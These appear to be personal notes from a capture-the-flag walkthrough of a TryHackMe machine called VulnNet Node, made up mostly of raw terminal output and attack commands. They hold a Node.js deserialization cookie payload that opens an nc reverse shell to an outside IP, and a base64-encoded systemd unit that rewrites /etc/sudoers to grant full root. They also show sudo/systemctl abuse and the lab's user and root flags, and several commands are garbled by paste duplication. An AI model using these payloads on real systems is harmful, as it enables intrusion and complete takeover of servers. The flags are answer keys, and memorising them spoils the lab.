Ncat: Connection from 10.10.232.157:58802.
/bin/sh: 0: can't access tty; job control turned off
# whoami;cat /root/root.txt
root
THM{abea728f211b105a608a720a37adabf9}

:)

now the 1st way

echo 'W1VuaXRdCkRlc2NyaXB0aW9uPUxvZ3Mgc3lzdGVtIHN0YXRpc3RpY3MgdG8gdGhlIHN5c3RlbWQgam91cm5hbApXYW50cz12dWxubmV0LWF1dG8udGltZXIKW1NlcnZpY2VdCiMgR2F0aGVyIHN5c3RlbSBzdGF0aXN0aWNzClR5cGU9Zm9ya2luZwojRXhlY1N0YXJ0PS9iaW4vZGYKRXhlY1N0YXJ0PS9iaW4vc2ggLWMgJ2VjaG8gInNlcnYtbWFuYWdlIEFMTD0ocm9vdCkgTk9QQVNTV0Q6IEFMTCIgPiAvZXRjL3N1ZG9lcnMnCltJbnN0YWxsXQpXYW50ZWRCeT1tdWx0aS11c2VyLnRhcmdldAo=' | base64 -d > /etc/systemd/system/vulnnet-job.service

serv-manage@vulnnet-node:/tmp/tmp.DHRcCalyiZ$ echo 'W1VuaXRdCkRlc2NyaXB0aW9uPUxvZ3Mgc3lzdGVtecho 'W1VuaXRdCkRlc2NyaXB0aW9uPUxvZ3Mgc3lzdGVtIHN0YXRpc3RpY3MgdG8gdGhlIHN5c3RlbWQgam91cm5hbApXYW50cz12dWxubmV0LWF1dG8udGltZXIKW1NlcnZpY2VdCiMgR2F0aGVyIHN5c3RlbSBzdGF0aXN0aWNzClR5cGU9Zm9ya2luZwojRXhlY1N0YXJ0PS9iaW4vZGYKRXhlY1N0YXJ0PS9iaW4vc2ggLWMgJ2VjaG8gInNlcnYtbWFuYWdlIEFMTD0ocm9vdCkgTk9QQVNTV0Q6IEFMTCIgPiAvZXRjL3N1ZG9lcnMnCltJbnN0YWxsXQpXYW50ZWRCeT1tdWx0aS11c2VyLnRhcmdldAo=' | base64 -d > /etc/systemd/system/vulnnet-job.service

dWx0aS11c2VyLnRhcmdldAo=' | base64 -d > /etc/systemd/system/vulnnet-job.servicetd
serv-manage@vulnnet-node:/tmp/tmp.DHRcCalyiZ$ 
serv-manage@vulnnet-node:/tmp/tmp.DHRcCalyiZ$ sudo -l                                       sudo -l
sudo -l
Matching Defaults entries for serv-manage on vulnnet-node:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User serv-manage may run the following commands on vulnnet-node:
    (root) NOPASSWD: /bin/systemctl start vulnnet-auto.timer
    (root) NOPASSWD: /bin/systemctl stop vulnnet-auto.timer
    (root) NOPASSWD: /bin/systemctl daemon-reload

again stop the timer
serv-manage@vulnnet-node:/tmp/tmp.DHRcCalyiZ$ sudo /bin/systemctl stop vulnnet-auto.timer
serv-manage@vulnnet-node:/tmp/tmp.DHRcCalyiZ$ sudo /bin/systemctl daemon-reload
serv-manage@vulnnet-node:/tmp/tmp.DHRcCalyiZ$ sudo /bin/systemctl start vulnnet-auto.timer


serv-manage@vulnnet-node:/tmp/tmp.DHRcCalyiZ$ sudo -l                                       sudo -l
sudo -l
User serv-manage may run the following commands on vulnnet-node:
    (root) NOPASSWD: ALL
serv-manage@vulnnet-node:/tmp/tmp.DHRcCalyiZ$ sudo -s                                       sudo -s
sudo -s
root@vulnnet-node:/tmp/tmp.DHRcCalyiZ# cat /root/root.txt                     cat /root/root.txt
cat /root/root.txt
THM{abea728f211b105a608a720a37adabf9}

:)

it works

another cookie (nodejs de-serialization)

https://blog.gibbons.digital/hacking/2021/04/04/node.html

{"username":"_$$ND_FUNC$$_function (){\n \t require('child_process').exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.19.103 4444 >/tmp/f')}()","isGuest":false,"encoding": "utf-8"}

eyJ1c2VybmFtZSI6Il8kJE5EX0ZVTkMkJF9mdW5jdGlvbiAoKXtcbiBcdCByZXF1aXJlKCdjaGlsZF9wcm9jZXNzJykuZXhlYygncm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI%2BJjF8bmMgMTAuOC4xOS4xMDMgNDQ0NCA%2BL3RtcC9mJyl9KCkiLCJpc0d1ZXN0IjpmYWxzZSwiZW5jb2RpbmciOiAidXRmLTgifQo%3D

:)

```

![[Pasted image 20221228222341.png]]

![[Pasted image 20221228225026.png]]

What is the user flag? (user.txt)  

*THM{064640a2f880ce9ed7a54886f1bde821}*

What is the root flag? (root.txt)

*THM{abea728f211b105a608a720a37adabf9}*


[[Brooklyn Nine Nine]]